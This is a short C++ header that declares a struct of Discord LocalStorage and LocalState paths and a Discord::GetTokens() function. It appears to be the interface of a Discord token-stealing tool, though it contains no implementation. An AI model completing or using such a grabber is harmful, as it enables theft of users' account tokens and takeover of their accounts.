#ifndef DISCORD_HPP
#define DISCORD_HPP

#include <string>
#include <vector>

struct DiscordDir {
    std::vector<std::string> LocalStorage;
    std::string LocalState;
};

namespace Discord {
    std::vector<std::string> GetTokens();
}

#endif
